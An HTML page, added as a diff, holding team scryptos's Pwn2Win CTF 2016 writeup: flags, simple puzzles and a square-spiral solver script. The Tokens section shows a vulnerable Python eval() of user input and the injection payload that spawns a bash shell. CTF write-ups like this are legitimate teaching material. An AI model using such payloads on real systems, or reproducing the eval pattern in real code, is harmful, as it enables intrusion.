@@ -1,0 +1,994 @@
+<!DOCTYPE html>
+
+<html lang="en">
+
+<head>
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+    <meta name="apple-mobile-web-app-capable" content="yes">
+    <meta name="apple-mobile-web-app-status-bar-style" content="black">
+    <meta name="mobile-web-app-capable" content="yes">
+    
+    <title>
+        HackMD - Collaborative notes
+    </title>
+    <link rel="icon" type="image/png" href="https://hackmd.io/favicon.png">
+    <link rel="apple-touch-icon" href="https://hackmd.io/apple-touch-icon.png">
+
+    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.6/css/bootstrap.min.css">
+    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/font-awesome/4.5.0/css/font-awesome.min.css">
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/ionicons/2.0.1/css/ionicons.min.css">
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/highlight.js/8.8.0/styles/github-gist.min.css">
+    <style>
+        .markdown-body h1,.markdown-body h2{padding-bottom:.3em;border-bottom:1px solid #eee}.vimeo iframe,.youtube iframe,.youtube img{left:0;top:0;height:100%;position:absolute}.markdown-body{font-size:1pc;line-height:1.6;word-wrap:break-word}.markdown-body>:first-child{margin-top:0!important}.markdown-body>:last-child{margin-bottom:0!important}.markdown-body .absent{color:#c00}.markdown-body .anchor{position:absolute;top:0;bottom:0;left:0;display:block;padding-right:6px;padding-left:30px;margin-left:-30px}.markdown-body .anchor:focus{outline:0}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{position:relative;margin-top:1em;margin-bottom:1pc;font-weight:700;line-height:1.4}.markdown-body h1 .octicon-link,.markdown-body h2 .octicon-link,.markdown-body h3 .octicon-link,.markdown-body h4 .octicon-link,.markdown-body h5 .octicon-link,.markdown-body h6 .octicon-link{display:none;color:#000;vertical-align:middle}.markdown-body h1:hover .anchor,.markdown-body h2:hover .anchor,.markdown-body h3:hover .anchor,.markdown-body h4:hover .anchor,.markdown-body h5:hover .anchor,.markdown-body h6:hover .anchor{padding-left:8px;margin-left:-30px;line-height:1;text-decoration:none}.markdown-body h1:hover .anchor .octicon-link,.markdown-body h2:hover .anchor .octicon-link,.markdown-body h3:hover .anchor .octicon-link,.markdown-body h4:hover .anchor .octicon-link,.markdown-body h5:hover .anchor .octicon-link,.markdown-body h6:hover .anchor .octicon-link{display:inline-block}.markdown-body h1 code,.markdown-body h1 tt,.markdown-body h2 code,.markdown-body h2 tt,.markdown-body h3 code,.markdown-body h3 tt,.markdown-body h4 code,.markdown-body h4 tt,.markdown-body h5 code,.markdown-body h5 tt,.markdown-body h6 code,.markdown-body h6 tt{font-size:inherit}.markdown-body h1{font-size:2.25em;line-height:1.2}.markdown-body h2{font-size:1.75em;line-height:1.225}.markdown-body h3{font-size:1.5em;line-height:1.43}.markdown-body h4{font-size:1.25em}.markdown-body h5{font-size:1em}.markdown-body h6{font-size:1em;color:#777}.markdown-body blockquote,.markdown-body dl,.markdown-body ol,.markdown-body p,.markdown-body pre,.markdown-body table,.markdown-body ul{margin-top:0;margin-bottom:1pc}.markdown-body hr{height:4px;padding:0;margin:1pc 0;background-color:#e7e7e7;border:0}.markdown-body ol,.markdown-body ul{padding-left:2em}.markdown-body ol.no-list,.markdown-body ul.no-list{padding:0;list-style-type:none}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:0;margin-bottom:0}.markdown-body li>p{margin-top:1pc}.markdown-body dl{padding:0}.markdown-body dl dt{padding:0;margin-top:1pc;font-size:1em;font-style:italic;font-weight:700}.markdown-body dl dd{padding:0 1pc;margin-bottom:1pc}.markdown-body blockquote{padding:0 15px;color:#777;border-left:4px solid #ddd}.markdown-body blockquote>:first-child{margin-top:0}.markdown-body blockquote>:last-child{margin-bottom:0}.markdown-body table{display:block;width:100%;overflow:auto;word-break:normal;word-break:keep-all}.markdown-body table th{font-weight:700}.markdown-body table td,.markdown-body table th{padding:6px 13px;border:1px solid #ddd}.markdown-body table tr{background-color:#fff;border-top:1px solid #ccc}.markdown-body table tr:nth-child(2n){background-color:#f8f8f8}.markdown-body img{max-width:100%;-moz-box-sizing:border-box;box-sizing:border-box}.markdown-body .emoji{width:20px;height:20px;max-width:none;margin-bottom:0}.markdown-body span.frame{display:block;overflow:hidden}.markdown-body span.frame>span{display:block;float:left;width:auto;padding:7px;margin:13px 0 0;overflow:hidden;border:1px solid #ddd}.markdown-body span.frame span img{display:block;float:left}.markdown-body span.frame span span{display:block;padding:5px 0 0;clear:both;color:#333}.markdown-body span.align-center{display:block;overflow:hidden;clear:both}.markdown-body span.align-center>span{display:block;margin:13px auto 0;overflow:hidden;text-align:center}.markdown-body span.align-center span img{margin:0 auto;text-align:center}.markdown-body span.align-right{display:block;overflow:hidden;clear:both}.markdown-body span.align-right>span{display:block;margin:13px 0 0;overflow:hidden;text-align:right}.markdown-body span.align-right span img{margin:0;text-align:right}.markdown-body span.float-left{display:block;float:left;margin-right:13px;overflow:hidden}.markdown-body span.float-left span{margin:13px 0 0}.markdown-body span.float-right{display:block;float:right;margin-left:13px;overflow:hidden}.markdown-body span.float-right>span{display:block;margin:13px auto 0;overflow:hidden;text-align:right}.markdown-body code,.markdown-body tt{padding:.2em 0;margin:0;font-size:85%;background-color:rgba(0,0,0,.04);border-radius:3px}.markdown-body code:after,.markdown-body code:before,.markdown-body tt:after,.markdown-body tt:before{letter-spacing:-.2em;content:"\00a0"}.markdown-body code br,.markdown-body tt br{display:none}.markdown-body del code{text-decoration:inherit}.markdown-body pre>code{padding:0;margin:0;font-size:100%;word-break:normal;white-space:pre;background:0 0;border:0}.markdown-body .highlight{margin-bottom:1pc}.markdown-body .highlight pre,.markdown-body pre{padding:1pc;overflow:auto;font-size:85%;line-height:1.45;background-color:#f7f7f7;border-radius:3px}.markdown-body .highlight pre{margin-bottom:0;word-break:normal}.markdown-body pre code,.markdown-body pre tt{display:inline;max-width:initial;padding:0;margin:0;overflow:initial;line-height:inherit;word-wrap:normal;background-color:transparent;border:0}.markdown-body pre code:after,.markdown-body pre code:before,.markdown-body pre tt:after,.markdown-body pre tt:before{content:normal}.markdown-body .csv-data td,.markdown-body .csv-data th{padding:5px;overflow:hidden;font-size:9pt;line-height:1;text-align:left;white-space:nowrap}.markdown-body .csv-data .blob-line-num{padding:10px 8px 9px;text-align:right;background:#fff;border:0}.markdown-body .csv-data tr{border-top:0}.markdown-body .csv-data th{font-weight:700;background:#f8f8f8;border-top:0}.markdown-body kbd{display:inline-block;padding:3px 5px;font-size:11px;line-height:10px;color:#555;vertical-align:middle;background-color:#fcfcfc;border:1px solid #ccc;border-bottom-color:#bbb;border-radius:3px;box-shadow:inset 0 -1px 0 #bbb}.news .alert .markdown-body blockquote{padding:0 0 0 40px;border:0}.activity-tab .news .alert .commits,.activity-tab .news .markdown-body blockquote{padding-left:0}.task-list-item{list-style-type:none}.task-list-item label{font-weight:400}.task-list-item.enabled label{cursor:pointer}.task-list-item+.task-list-item{margin-top:3px}.task-list-item-checkbox{float:left;margin:.31em 0 .2em -1.3em!important;vertical-align:middle;cursor:default!important}.markdown-body{font-family:"Helvetica Neue",Helvetica,Arial,sans-serif;padding-top:40px;padding-bottom:40px;max-width:758px;overflow:visible!important}.markdown-body pre{word-wrap:normal;border:inherit!important}.markdown-body code{color:inherit!important}.markdown-body pre code .wrapper{display:-webkit-inline-flex;display:-moz-inline-flex;display:-ms-inline-flex;display:-o-inline-flex;display:inline-flex}.markdown-body pre code .gutter{float:left;overflow:hidden;-webkit-user-select:none;user-select:none}.markdown-body pre code .gutter.linenumber{text-align:right;position:relative;display:inline-block;cursor:default;z-index:4;padding:0 8px 0 0;min-width:20px;box-sizing:content-box;color:#afafaf!important;border-right:3px solid #6ce26c!important}.markdown-body pre code .gutter.linenumber>span:before{content:attr(data-linenumber)}.markdown-body pre code .code{float:left;margin:0 0 0 1pc}.markdown-body .gist .line-numbers{border-left:none;border-top:none;border-bottom:none}.markdown-body .gist .line-data{border:none}.markdown-body .gist table{border-spacing:0;border-collapse:inherit!important}.markdown-body code[data-gist-id]{background:0 0;padding:0}.ui-user-icon,.vimeo,.youtube{background-position:center center;background-repeat:no-repeat;background-size:contain}.markdown-body code[data-gist-id]:after,.markdown-body code[data-gist-id]:before{content:''}.markdown-body[dir=rtl] pre{direction:ltr}.markdown-body[dir=rtl] code{direction:ltr;unicode-bidi:embed}.markdown-body .alert>p{margin-bottom:0}.markdown-body pre.flow-chart,.markdown-body pre.graphviz,.markdown-body pre.mermaid,.markdown-body pre.sequence-diagram{text-align:center;background-color:inherit;border-radius:0;white-space:inherit}.markdown-body pre.flow-chart>code,.markdown-body pre.graphviz>code,.markdown-body pre.mermaid>code,.markdown-body pre.sequence-diagram>code{text-align:left}.markdown-body pre.flow-chart>svg,.markdown-body pre.graphviz>svg,.markdown-body pre.mermaid>svg,.markdown-body pre.sequence-diagram>svg{max-width:100%;height:100%}.vimeo,.youtube{position:relative;cursor:pointer;display:table;width:100%;text-align:center;background-color:#000;overflow:hidden}.youtube{position:relative;width:100%;padding-bottom:56.25%}.vimeo img{width:100%;object-fit:contain;z-index:0}.youtube img{width:100%;object-fit:cover;z-index:0}.vimeo iframe,.youtube iframe{width:100%;vertical-align:middle;z-index:1}.vimeo .icon,.youtube .icon{position:absolute;height:auto;width:auto;top:50%;left:50%;margin-top:-40px;margin-left:-40px;color:#fff;opacity:.3;-webkit-transition:opacity .2s;transition:opacity .2s;z-index:0}.vimeo:hover .icon,.youtube:hover .icon{opacity:.6;-webkit-transition:opacity .2s;transition:opacity .2s}.slideshare .inner,.speakerdeck .inner{position:relative;width:100%}.slideshare .inner iframe,.speakerdeck .inner iframe{position:absolute;top:0;bottom:0;left:0;right:0;width:100%;height:100%}h1:hover .header-link,h2:hover .header-link,h3:hover .header-link,h4:hover .header-link,h5:hover .header-link,h6:hover .header-link{opacity:1;-webkit-transition:opacity .2s ease-in-out .1s;-moz-transition:opacity .2s ease-in-out .1s;-o-transition:opacity .2s ease-in-out .1s;transition:opacity .2s ease-in-out .1s}.header-link{position:relative;left:.5em;right:.5em;opacity:0;font-size:.8em;-webkit-transition:opacity .2s ease-in-out .1s;-moz-transition:opacity .2s ease-in-out .1s;-o-transition:opacity .2s ease-in-out .1s;transition:opacity .2s ease-in-out .1s}.ui-infobar{max-width:758px;margin-top:25px;margin-bottom:-25px;color:#777}.ui-toc{position:fixed;bottom:20px;z-index:10000}.ui-toc-label{opacity:.3;background-color:#ccc;border:none;-webkit-transition:opacity .2s;transition:opacity .2s}.ui-toc .open .ui-toc-label{opacity:1;color:#fff;-webkit-transition:opacity .2s;transition:opacity .2s}.ui-toc-label:focus{opacity:.3;background-color:#ccc;color:#000}.ui-toc-label:hover{opacity:1;background-color:#ccc;-webkit-transition:opacity .2s;transition:opacity .2s}.ui-toc-dropdown{margin-top:23px;margin-bottom:20px;padding-left:10px;padding-right:10px;max-width:45vw;width:25vw;max-height:65vh;overflow:auto;text-align:inherit}.ui-toc-dropdown[dir=rtl] .nav{padding-right:0;letter-spacing:.0029em}.ui-toc-dropdown a{overflow:hidden;text-overflow:ellipsis;white-space:pre}.ui-toc-dropdown .nav>li>a{display:block;padding:4px 20px;font-size:13px;font-weight:500;color:#767676}.ui-toc-dropdown .nav>li>a:focus,.ui-toc-dropdown .nav>li>a:hover{padding-left:19px;color:#000;text-decoration:none;background-color:transparent;border-left:1px solid #000}.ui-toc-dropdown[dir=rtl] .nav>li>a:focus,.ui-toc-dropdown[dir=rtl] .nav>li>a:hover{padding-right:19px;border-left:none;border-right:1px solid #000}.ui-toc-dropdown .nav>.active:focus>a,.ui-toc-dropdown .nav>.active:hover>a,.ui-toc-dropdown .nav>.active>a{padding-left:18px;font-weight:700;color:#000;background-color:transparent;border-left:2px solid #000}.ui-toc-dropdown[dir=rtl] .nav>.active:focus>a,.ui-toc-dropdown[dir=rtl] .nav>.active:hover>a,.ui-toc-dropdown[dir=rtl] .nav>.active>a{padding-right:18px;border-left:none;border-right:2px solid #000}.ui-toc-dropdown .nav .nav{display:none;padding-bottom:10px}.ui-toc-dropdown .nav>.active>ul,.ui-user-icon{display:block}.ui-toc-dropdown .nav .nav>li>a{padding-top:1px;padding-bottom:1px;padding-left:30px;font-size:9pt;font-weight:400}.ui-toc-dropdown[dir=rtl] .nav .nav>li>a{padding-right:30px}.ui-toc-dropdown .nav .nav>li>ul>li>a{padding-top:1px;padding-bottom:1px;padding-left:40px;font-size:9pt;font-weight:400}.ui-toc-dropdown[dir=rtl] .nav .nav>li>ul>li>a{padding-right:40px}.ui-toc-dropdown .nav .nav>li>a:focus,.ui-toc-dropdown .nav .nav>li>a:hover{padding-left:29px}.ui-toc-dropdown[dir=rtl] .nav .nav>li>a:focus,.ui-toc-dropdown[dir=rtl] .nav .nav>li>a:hover{padding-right:29px}.ui-toc-dropdown .nav .nav>li>ul>li>a:focus,.ui-toc-dropdown .nav .nav>li>ul>li>a:hover{padding-left:39px}.ui-toc-dropdown[dir=rtl] .nav .nav>li>ul>li>a:focus,.ui-toc-dropdown[dir=rtl] .nav .nav>li>ul>li>a:hover{padding-right:39px}.ui-toc-dropdown .nav .nav>.active:focus>a,.ui-toc-dropdown .nav .nav>.active:hover>a,.ui-toc-dropdown .nav .nav>.active>a{padding-left:28px;font-weight:500}.ui-toc-dropdown[dir=rtl] .nav .nav>.active:focus>a,.ui-toc-dropdown[dir=rtl] .nav .nav>.active:hover>a,.ui-toc-dropdown[dir=rtl] .nav .nav>.active>a{padding-right:28px}.ui-toc-dropdown .nav .nav>.active>.nav>.active:focus>a,.ui-toc-dropdown .nav .nav>.active>.nav>.active:hover>a,.ui-toc-dropdown .nav .nav>.active>.nav>.active>a{padding-left:38px;font-weight:500}.ui-toc-dropdown[dir=rtl] .nav .nav>.active>.nav>.active:focus>a,.ui-toc-dropdown[dir=rtl] .nav .nav>.active>.nav>.active:hover>a,.ui-toc-dropdown[dir=rtl] .nav .nav>.active>.nav>.active>a{padding-right:38px}.markdown-body[lang^=ja]{font-family:"Helvetica Neue",Helvetica,Arial,Meiryo,"MS Gothic","ＭＳ ゴシック",sans-serif}.ui-toc-dropdown[lang^=ja]{font-family:"Source Sans Pro",Helvetica,Arial,"Meiryo UI","MS PGothic","ＭＳ Ｐゴシック",sans-serif}.markdown-body[lang=zh-tw]{font-family:"Helvetica Neue",Helvetica,Arial,"Microsoft JhengHei","微軟正黑",sans-serif}.ui-toc-dropdown[lang=zh-tw]{font-family:"Source Sans Pro",Helvetica,Arial,"Microsoft JhengHei UI","微軟正黑UI",sans-serif}.markdown-body[lang=zh-cn]{font-family:"Helvetica Neue",Helvetica,Arial,"Microsoft YaHei","微软雅黑",sans-serif}.ui-toc-dropdown[lang=zh-cn]{font-family:"Source Sans Pro",Helvetica,Arial,"Microsoft YaHei UI","微软雅黑UI",sans-serif}.ui-affix-toc{position:fixed;top:0;max-width:15vw;max-height:70vh;overflow:auto}.back-to-top,.go-to-bottom{display:block;padding:4px 10px;margin-top:10px;margin-left:10px;font-size:9pt;font-weight:500;color:#999}.back-to-top:focus,.back-to-top:hover,.go-to-bottom:focus,.go-to-bottom:hover{color:#563d7c;text-decoration:none}.go-to-bottom{margin-top:0}.ui-user-icon{width:20px;height:20px;border-radius:3px;margin-top:2px;margin-bottom:2px;margin-right:5px}.ui-user-icon.small,small .dropdown{display:inline-block}.ui-user-icon.small{width:18px;height:18px;vertical-align:middle;margin:0 0 .2em}small span{line-height:22px}small .dropdown a:focus,small .dropdown a:hover{text-decoration:none}.unselectable{-moz-user-select:none;-khtml-user-select:none;-webkit-user-select:none;-o-user-select:none;user-select:none}@media print{blockquote,div,img,pre,table{page-break-inside:avoid!important}a[href]:after{font-size:9pt!important}}@font-face{font-family:'Source Code Pro';font-style:normal;font-weight:300;src:local('Source Code Pro Light'),local('SourceCodePro-Light'),url(https://fonts.gstatic.com/s/sourcecodepro/v6/leqv3v-yTsJNC7nFznSMqUBls_1aQwi4AfipSOlE3SU.ttf) format('truetype')}@font-face{font-family:'Source Code Pro';font-style:normal;font-weight:400;src:local('Source Code Pro'),local('SourceCodePro-Regular'),url(https://fonts.gstatic.com/s/sourcecodepro/v6/mrl8jkM18OlOQN8JLgasD1zCdIATDt8zXO3QNtzVeJ8.ttf) format('truetype')}@font-face{font-family:'Source Code Pro';font-style:normal;font-weight:500;src:local('Source Code Pro Medium'),local('SourceCodePro-Medium'),url(https://fonts.gstatic.com/s/sourcecodepro/v6/leqv3v-yTsJNC7nFznSMqdgxThF69EFTxeh70dQtJtE.ttf) format('truetype')}@font-face{font-family:'Source Sans Pro';font-style:normal;font-weight:300;src:local('Source Sans Pro Light'),local('SourceSansPro-Light'),url(https://fonts.gstatic.com/s/sourcesanspro/v9/toadOcfmlt9b38dHJxOBGEBls_1aQwi4AfipSOlE3SU.ttf) format('truetype')}@font-face{font-family:'Source Sans Pro';font-style:normal;font-weight:400;src:local('Source Sans Pro'),local('SourceSansPro-Regular'),url(https://fonts.gstatic.com/s/sourcesanspro/v9/ODelI1aHBYDBqgeIAH2zlFzCdIATDt8zXO3QNtzVeJ8.ttf) format('truetype')}@font-face{font-family:'Source Sans Pro';font-style:normal;font-weight:600;src:local('Source Sans Pro Semibold'),local('SourceSansPro-Semibold'),url(https://fonts.gstatic.com/s/sourcesanspro/v9/toadOcfmlt9b38dHJxOBGGvd-IutAbwf5FQ8ZpuI2w4.ttf) format('truetype')}@font-face{font-family:'Source Sans Pro';font-style:italic;font-weight:300;src:local('Source Sans Pro Light Italic'),local('SourceSansPro-LightIt'),url(https://fonts.gstatic.com/s/sourcesanspro/v9/fpTVHK8qsXbIeTHTrnQH6I48KljrVa8Zcyi9xGGohEU.ttf) format('truetype')}@font-face{font-family:'Source Sans Pro';font-style:italic;font-weight:400;src:local('Source Sans Pro Italic'),local('SourceSansPro-It'),url(https://fonts.gstatic.com/s/sourcesanspro/v9/M2Jd71oPJhLKp0zdtTvoM6xot8ENfkYez2Lz7rcrw70.ttf) format('truetype')}@font-face{font-family:'Source Sans Pro';font-style:italic;font-weight:600;src:local('Source Sans Pro Semibold Italic'),local('SourceSansPro-SemiboldIt'),url(https://fonts.gstatic.com/s/sourcesanspro/v9/fpTVHK8qsXbIeTHTrnQH6KjMMkbXdLGS8FpAnMJn5J0.ttf) format('truetype')}@font-face{font-family:'Source Serif Pro';font-style:normal;font-weight:400;src:local('Source Serif Pro'),local('SourceSerifPro-Regular'),url(https://fonts.gstatic.com/s/sourceserifpro/v4/CeUM4np2c42DV49nanp55WdjwOOpWxWrsXXkZJyNRnI.ttf) format('truetype')}body{font-smoothing:subpixel-antialiased!important;-webkit-font-smoothing:subpixel-antialiased!important;-moz-osx-font-smoothing:auto!important;text-shadow:1px 1px 1px rgba(0,0,0,.004);-webkit-overflow-scrolling:touch;font-family:"Source Sans Pro",Helvetica,Arial,sans-serif;letter-spacing:.025em}:focus{outline:0!important}::-moz-focus-inner{border:0!important}body.modal-open{overflow-y:auto;padding-right:0!important}
+    </style>
+    <!-- HTML5 shim and Respond.js for IE8 support of HTML5 elements and media queries -->
+    <!-- WARNING: Respond.js doesn't work if you view the page via file:// -->
+    <!--[if lt IE 9]>
+    	<script src="https://oss.maxcdn.com/html5shiv/3.7.2/html5shiv.min.js"></script>
+    	<script src="https://oss.maxcdn.com/respond/1.4.2/respond.min.js"></script>
+		<script src="https://cdnjs.cloudflare.com/ajax/libs/es5-shim/4.2.0/es5-shim.min.js"></script>
+    <![endif]-->
+</head>
+
+<body>
+    <div id="doc" class="markdown-body container-fluid"><h2 id="pwn2win-ctf-2016-writeup-team-scryptos">Pwn2Win CTF 2016 writeup (team scryptos)<a class="header-link hidden-xs" href="#pwn2win-ctf-2016-writeup-team-scryptos" title="pwn2win-ctf-2016-writeup-team-scryptos"><span class="sr-only"></span><i class="fa fa-link"></i></a></h2><p>1600pts / <strong>3rd</strong></p><p><a href="http://i.imgur.com/D5wO3zm.png" target="_blank"><img src="http://i.imgur.com/D5wO3zm.png" alt=""></a></p><h3 id="skycast-story-10">Skycast - Story 10<a class="header-link hidden-xs" href="#skycast-story-10" title="skycast-story-10"><span class="sr-only"></span><i class="fa fa-link"></i></a></h3><p>The flag was writen in the challenge description.<br>
+flag: <code>CTF-BR{SKYcast_recebido_e_lido}</code></p><h3 id="sum-hello-world-platform-ppc-m-20">Sum (Hello World Platform) - PPC-M 20<a class="header-link hidden-xs" href="#sum-hello-world-platform-ppc-m-20" title="sum-hello-world-platform-ppc-m-20"><span class="sr-only"></span><i class="fa fa-link"></i></a></h3><p>This challenge had sample code in Python/Java/C++, so I just ran it and got flag after seconds.<br>
+flag: <code>CTF-BR{Congrats!_you_know_how_to_sum!}</code></p><h3 id="tokens-pyexp-50">Tokens - PyExp 50<a class="header-link hidden-xs" href="#tokens-pyexp-50" title="tokens-pyexp-50"><span class="sr-only"></span><i class="fa fa-link"></i></a></h3><p>Python code injection.</p><pre><code class="python hljs"><div class="wrapper"><div class="gutter linenumber"><span data-linenumber="38"></span>
+<span data-linenumber="39"></span>
+<span data-linenumber="40"></span>
+<span data-linenumber="41"></span>
+<span data-linenumber="42"></span>
+<span data-linenumber="43"></span>
+<span data-linenumber="44"></span></div><div class="code">       var = raw_input(<span class="hljs-string">"&gt;&gt;&gt; "</span>)
+       <span class="hljs-keyword">if</span> validation(var):
+         tmp = var.split()
+         cmd = tmp[<span class="hljs-number">0</span>]
+         serial = tmp[<span class="hljs-number">1</span>]
+         <span class="hljs-keyword">if</span> cmd == <span class="hljs-string">"gen"</span>:
+           tmp = eval(<span class="hljs-string">"{"</span> + <span class="hljs-string">"cmd"</span> + <span class="hljs-string">":"</span> + serial + <span class="hljs-string">"}"</span>)
+</div></div></code></pre><p><code>gen __import__('os').system('bash')</code> gives you bash shell, the flag was on the source code.<br>
+flag: <code>CTF-BR{Iez4ouf9bah3PungoOshae9eihiegh3ieseEnuGh}</code></p><h3 id="g00d-b0y-bonus-10">g00d b0y - Bonus 10<a class="header-link hidden-xs" href="#g00d-b0y-bonus-10" title="g00d-b0y-bonus-10"><span class="sr-only"></span><i class="fa fa-link"></i></a></h3><blockquote>
+<p>2016-03-25 16:28:15 - You are a g00d b0y if you have read what you should have read before the CTF opened ;)</p>
+</blockquote><p>The hint reminded me of /rules, the flag was on the bottom of rule page.<br>
+flag: <code>CTF-BR{RTFM_1s_4_g00d_3xpr3ss10n_v2.0}</code></p><h3 id="square-infinite-spiral-ppc-m-80">Square Infinite Spiral - PPC-M 80<a class="header-link hidden-xs" href="#square-infinite-spiral-ppc-m-80" title="square-infinite-spiral-ppc-m-80"><span class="sr-only"></span><i class="fa fa-link"></i></a></h3><p>O(1).</p><pre><code class="python hljs"><div class="wrapper"><div class="gutter linenumber"><span data-linenumber="1"></span>
+<span data-linenumber="2"></span>
+<span data-linenumber="3"></span>
+<span data-linenumber="4"></span>
+<span data-linenumber="5"></span>
+<span data-linenumber="6"></span>
+<span data-linenumber="7"></span>
+<span data-linenumber="8"></span>
+<span data-linenumber="9"></span>
+<span data-linenumber="10"></span>
+<span data-linenumber="11"></span>
+<span data-linenumber="12"></span>
+<span data-linenumber="13"></span>
+<span data-linenumber="14"></span>
+<span data-linenumber="15"></span>
+<span data-linenumber="16"></span>
+<span data-linenumber="17"></span>
+<span data-linenumber="18"></span>
+<span data-linenumber="19"></span>
+<span data-linenumber="20"></span>
+<span data-linenumber="21"></span>
+<span data-linenumber="22"></span>
+<span data-linenumber="23"></span>
+<span data-linenumber="24"></span>
+<span data-linenumber="25"></span>
+<span data-linenumber="26"></span>
+<span data-linenumber="27"></span>
+<span data-linenumber="28"></span>
+<span data-linenumber="29"></span>
+<span data-linenumber="30"></span>
+<span data-linenumber="31"></span>
+<span data-linenumber="32"></span>
+<span data-linenumber="33"></span>
+<span data-linenumber="34"></span>
+<span data-linenumber="35"></span>
+<span data-linenumber="36"></span>
+<span data-linenumber="37"></span>
+<span data-linenumber="38"></span>
+<span data-linenumber="39"></span>
+<span data-linenumber="40"></span>
+<span data-linenumber="41"></span>
+<span data-linenumber="42"></span>
+<span data-linenumber="43"></span>
+<span data-linenumber="44"></span>
+<span data-linenumber="45"></span>
+<span data-linenumber="46"></span>
+<span data-linenumber="47"></span>
+<span data-linenumber="48"></span>
+<span data-linenumber="49"></span>
+<span data-linenumber="50"></span>
+<span data-linenumber="51"></span>
+<span data-linenumber="52"></span>
+<span data-linenumber="53"></span>
+<span data-linenumber="54"></span>
+<span data-linenumber="55"></span>
+<span data-linenumber="56"></span>
+<span data-linenumber="57"></span>
+<span data-linenumber="58"></span>
+<span data-linenumber="59"></span>
+<span data-linenumber="60"></span>
+<span data-linenumber="61"></span>
+<span data-linenumber="62"></span>
+<span data-linenumber="63"></span>
+<span data-linenumber="64"></span>
+<span data-linenumber="65"></span>
+<span data-linenumber="66"></span></div><div class="code"><span class="hljs-comment">#!/usr/bin/env python</span>
+<span class="hljs-keyword">import</span> ssl, socket
+<span class="hljs-keyword">from</span> sys <span class="hljs-keyword">import</span> argv
+<span class="hljs-keyword">from</span> gmpy <span class="hljs-keyword">import</span> *
+
+<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">solve</span><span class="hljs-params">(n)</span>:</span>
+  x = sqrt(n)
+  t = n - (x**<span class="hljs-number">2</span>)
+
+  ans_x, ans_y = <span class="hljs-number">0</span>, <span class="hljs-number">0</span>
+  <span class="hljs-keyword">if</span> x % <span class="hljs-number">2</span> == <span class="hljs-number">1</span>:
+    s = (x-<span class="hljs-number">1</span>) / <span class="hljs-number">2</span>
+    l = (s+<span class="hljs-number">1</span>) * <span class="hljs-number">2</span>
+    <span class="hljs-keyword">if</span> t == <span class="hljs-number">0</span>:
+      ans_x = s
+      ans_y = -s
+    <span class="hljs-keyword">elif</span> t &lt;= l:
+      ans_x = s + <span class="hljs-number">1</span>
+      ans_y = -s + (t - <span class="hljs-number">1</span>)
+    <span class="hljs-keyword">else</span>:
+      ans_x = s + <span class="hljs-number">1</span> - (t - l)
+      ans_y = -s + (l - <span class="hljs-number">1</span>)
+  <span class="hljs-keyword">else</span>:
+    s = x / <span class="hljs-number">2</span>
+    l = s*<span class="hljs-number">2</span> + <span class="hljs-number">1</span>
+    <span class="hljs-keyword">if</span> t == <span class="hljs-number">0</span>:
+      ans_x = -s + <span class="hljs-number">1</span>
+      ans_y = s
+    <span class="hljs-keyword">elif</span> t == <span class="hljs-number">1</span>:
+      ans_x = -s
+      ans_y = s
+    <span class="hljs-keyword">elif</span> t &lt;= l:
+      ans_x = -s
+      ans_y = s - (t - <span class="hljs-number">1</span>)
+    <span class="hljs-keyword">else</span>:
+      ans_x = -s + (t - l)
+      ans_y = s - (l - <span class="hljs-number">1</span>)
+
+  <span class="hljs-keyword">return</span> ans_x, ans_y
+
+<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Connect</span><span class="hljs-params">(object)</span>:</span>
+    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">__init__</span><span class="hljs-params">(self, host, port)</span>:</span>
+        self.context = ssl.create_default_context()
+        self.conn = self.context.wrap_socket(
+            socket.socket(socket.AF_INET),
+            server_hostname=host)
+        self.conn.connect((host, port))
+        self.f = self.conn.makefile(<span class="hljs-string">'r+b'</span>, <span class="hljs-number">0</span>)
+    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">__enter__</span><span class="hljs-params">(self)</span>:</span>
+        <span class="hljs-keyword">return</span> self.f
+    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">__exit__</span><span class="hljs-params">(self, type, value, traceback)</span>:</span>
+        self.f.close()
+
+<span class="hljs-keyword">with</span> Connect(<span class="hljs-string">'programming.pwn2win.party'</span>, <span class="hljs-number">9004</span>) <span class="hljs-keyword">as</span> f:
+    <span class="hljs-keyword">for</span> line <span class="hljs-keyword">in</span> f:
+        line = line.strip()
+        print(<span class="hljs-string">'received: %s'</span> % line)
+
+        <span class="hljs-keyword">if</span> line.startswith(<span class="hljs-string">'CTF-BR{'</span>) <span class="hljs-keyword">or</span> \
+           line == <span class="hljs-string">'WRONG ANSWER'</span>: <span class="hljs-keyword">break</span>
+
+        n = int(line)
+        s = solve(n + <span class="hljs-number">1</span>)
+
+        f.write(<span class="hljs-string">'%d %d\n'</span> % (s[<span class="hljs-number">0</span>], s[<span class="hljs-number">1</span>]))
+        <span class="hljs-keyword">print</span> <span class="hljs-string">'.'</span>
+</div></div></code></pre><p>flag: <code>CTF-BR{iT-Was-JusT-BIgInteGeR-MFQnQRqKLcSHi}</code></p><h3 id="sequences-ppc-40">Sequences - PPC 40<a class="header-link hidden-xs" href="#sequences-ppc-40" title="sequences-ppc-40"><span class="sr-only"></span><i class="fa fa-link"></i></a></h3><p>In this challenge we are given a list of index/sequences like belows:</p><pre><code>7 - 5 -&gt; 15 -&gt; 45
+8 - 24 -&gt; 44 -&gt; 81
+</code></pre><p>What we need to this is to predict n-th number of given sequnce. below’s are a list of sequences that we found out during the CTF:</p><ol>
